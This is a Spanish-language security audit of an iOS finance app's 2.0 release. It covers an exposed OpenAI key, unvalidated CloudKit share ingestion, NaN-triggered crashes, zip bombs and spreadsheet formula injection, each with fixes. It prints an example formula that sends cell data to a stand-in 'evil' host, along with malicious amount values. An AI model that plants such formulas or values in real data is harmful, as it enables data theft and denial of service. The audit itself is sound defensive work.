# Audit — Security review enfocado (Yala 2.0)

**Fecha:** 2026-06-14 · **Método:** workflow multi-agente — 6 superficies en paralelo (CKShare/trust boundary, deeplinks, OpenAI, almacenamiento local, import no confiable, secretos/logging) + **verificación adversarial** de cada hallazgo (cada uno pasó por un agente que intentó refutarlo). 28 agentes. **22 hallazgos → 11 confirmados, 11 descartados como falsos positivos.**

## Veredicto
Dos focos reales: **(1) un crítico de secretos** ya conocido pero ahora confirmado con evidencia dura, y **(2) un patrón raíz en los Grupos** — la zona CKShare es escribible por cualquier miembro y la ingestión remota **no valida nada**, mientras el path local sí. Ese único patrón genera 3 altos + 2 menores. Casi todo lo grave vive en el subsistema de Grupos (feature nueva de 2.0).

| Severidad | Confirmados |
|---|---|
| 🔴 Crítico | 1 (API key en el binario) |
| 🟠 Alto | 3 (todos del trust boundary CKShare) |
| 🟡 Medio | 3 |
| ⚪ Bajo | 2 |

---

## 🔴 CRÍTICO — API key de OpenAI en texto plano en el binario

**`Yala/Resources/Info.plist:20-23` + `APIKeyService.swift:17-26`** · (consolidado de 3 hallazgos + 1 derivado)

Un agente **extrajo la key real** (`sk-proj-…`, 164 chars) en texto plano del archive shippeable (`.asc/artifacts/Yala-build18.xcarchive/…/Info.plist`). La `EXCHANGE_RATE_API_KEY` está expuesta igual. Cualquiera que descomprima el `.ipa` la lee en segundos y factura contra tu cuenta de OpenAI. **El rate-limit es client-side (UserDefaults) → trivialmente ignorado** con la key robada; rotarla exige nueva versión.

**Esto ya está en tu D-C** (diferido consciente, proxy backend como épico). Pero el workflow añade dos hechos que cambian el cálculo:
1. La mitigación interina declarada ("rate-limit + cuota") **no mitiga** — es client-side.
2. La key real ya viaja extraíble en un archive real.

**Recomendación antes de subir (sin esperar al proxy):**
- **Rotar** la key actual (ya está en el archive de build18).
- Poner un **hard spending cap server-side** en el dashboard de OpenAI (esto sí es no-bypasseable, a diferencia del límite en la app).
- Actualizar la D-C: el proxy + App Attest sigue siendo el fix definitivo, pero el interino real es cap+rotación, no el contador local.

---

## 🟠 PATRÓN RAÍZ — CKShare `.readWrite` + ingestión remota sin validar

`SplitZoneManager.swift:173` crea el share con `publicPermission = .readWrite` ("cualquiera con el link escribe"). El path de escritura **local** valida (`GroupExpenseService` checa `amount > 0`, suma de shares, membresía), pero la **ingestión remota** (`SplitSyncManager.applyExpense/applyShare/applySettlement` + `CKRecordTranslator`) inserta los records crudos **sin ninguna validación**. Un miembro con un cliente modificado cruza el trust boundary hacia los demás. Los 3 altos comparten esta raíz — **un solo fix los cierra** (capa de validación en la ingestión remota: `isFinite`, signo, clamp de rango, membresía, longitud).

### A1 (alto) — Montos remotos corrompen balances de todos
`CKRecordTranslator.swift:163,282,340` deserializa `amount` como `Double ?? 0` sin validar. Un `share.amount = -9e9` o settlement gigante entra directo a `GroupBalanceService.calculateBalances` → falsea "quién debe a quién" de todos los miembros y **puede burlar el gate `balance==0` de `softDelete`** (`GroupService.swift:218`).

### A2 (alto) — NaN/Infinity remoto → crash persistente (DoS) ⚠️ reproducido
`GroupBalanceService.swift:279-283,311` hace `Decimal(balance.totalPaid)` sobre Doubles remotos sin guard. Un agente **reprodujo empíricamente** `Decimal(Double.nan)` → SIGTRAP (exit 133) en el toolchain del proyecto. Un miembro publica un expense con `amount = NaN`/`Infinity` y la app **crashea de forma determinista** cada vez que la víctima abre el grupo con "mostrar en una sola moneda". **Es el más feo y el más barato de arreglar** (un `guard amount.isFinite` en la deserialización).

### A3 (alto) — El gasto malicioso envenena las finanzas PERSONALES
`GroupTransactionBridge.swift:252,277,279`: al sincronizar un expense remoto con `isRemoteSync=true` (bridge ON por default), escribe `realTx.amount = -totalAmount` y `note = expenseDescription` **en la cuenta real de la víctima** sin revalidar. Un miembro malicioso editando un expense bridgeado corrompe el saldo/presupuestos/score personales de la víctima. (Requiere una TX real pre-existente de la víctima en ese grupo; el caso de inyección pura cae como draft de Inbox que la víctima debe aprobar.)

---

## 🟡 Medios

### M1 — Fresh-install auto-acepta el CKShare antes de consentir
`CKShareEntryHandler.swift:69-80`: para un usuario sin onboarding, llama `acceptShare(metadata:)` **antes** de mostrar UI de confirmación (el path de reconnect sí difiere al tap del usuario). La víctima se une a la zona del atacante y escribe su identidad iCloud/displayName ahí sin un "Unirme" explícito. Mitigado en parte: entra como `.pendingApproval` (sin acceso a datos del atacante hasta que este apruebe). **Fix:** diferir el accept a la confirmación también en el path fresh-user.

### M2 — CSV/XLSX formula injection (cruza trust boundary vía Grupos)
`TransactionsExportService.swift:491-509` (CSV) y `:601` (XLSX) no neutralizan celdas que empiezan con `= + - @`. Lo serio: el `expenseDescription` de **otro usuario** vía CKShare se escribe en el `note` de la víctima (`GroupTransactionBridge`) y se re-exporta. Una celda `=HYPERLINK("http://evil/?"&A1)` se ejecuta al abrir el export en Excel/Numbers viejo o LibreOffice. **Fix trivial:** prefijar celdas de riesgo con `'` o tab en ambas funciones.

### M3 — Zip bomb / OOM al importar XLSX
`XLSXReader.swift:57-72`: abre `.xlsx` arbitrarios del file picker sin límite de tamaño; CoreXLSX bufferea toda la entrada descomprimida en memoria. Un `.xlsx` de pocos KB que infla a GBs mata la app por jetsam. Self-inflicted (el usuario elige el archivo), de ahí medio. **Fix:** límite de tamaño/filas antes de parsear.

## ⚪ Bajos
- **B1** `CKRecordTranslator.swift:167,286,342-343` — `paidByMemberID`/`memberID` remotos sin validar pertenencia al grupo (subsumido por A1; el fix raíz lo cubre).
- **B2** `ChatAssistantService.swift:58-75` — rate-limit solo client-side (derivado del crítico; deja de importar con cap server-side).

---

## ✅ Descartados por verificación adversarial (11 — para transparencia)
No actuar sobre estos; cada uno fue refutado:
- "role/status escala a admin vía sync" — `refreshCurrentUserFlags` lo recalcula localmente.
- "metadata del invite sin sanitizar" / "perfil financiero completo a OpenAI sin minimización" — lo segundo es privacidad/disclosure (cubierto en `AUDIT-appstore-guidelines.md`), no vuln explotable.
- "LLM output construye drafts maliciosos" — el draft requiere aprobación del usuario.
- "biometric lock solo overlay" / "sin NSFileProtectionComplete" / "sin privacy screen al background" — by-design o cubierto por la protección de datos default de iOS; no explotable.
- "dataset financiero en App Group cleartext" — protegido por el sandbox; solo las extensiones de la propia app acceden.
- "CSV completo en memoria" / "monto enorme corrompe cálculos" — subsumidos por M3/A1.
- "telemetría manda UUID de budget" — UUID opaco, sin PII.

---

## Recomendación priorizada antes de subir 2.0
1. **Crítico (key):** rotar + hard cap server-side en OpenAI. Barato, hoy. Actualizar D-C.
2. **A2 (NaN-crash):** `guard amount.isFinite` en la deserialización remota. ~1 línea, mata un DoS persistente.
3. **A1+A3+B1 (validación remota):** capa de validación en `SplitSyncManager.applyRemote*`/`CKRecordTranslator` que espeje lo que el path local ya valida (signo, rango, suma, membresía). Un fix, cierra varios.
4. **M2 (CSV injection):** prefijar celdas de riesgo. Trivial.
5. **M1 (auto-accept) + M3 (zip bomb):** sprint de hardening; no son los más urgentes.

El patrón raíz (1-3) es el corazón del riesgo y vive todo en Grupos. Conviene un sprint de hardening de la ingestión remota antes de exponer Grupos a usuarios reales.
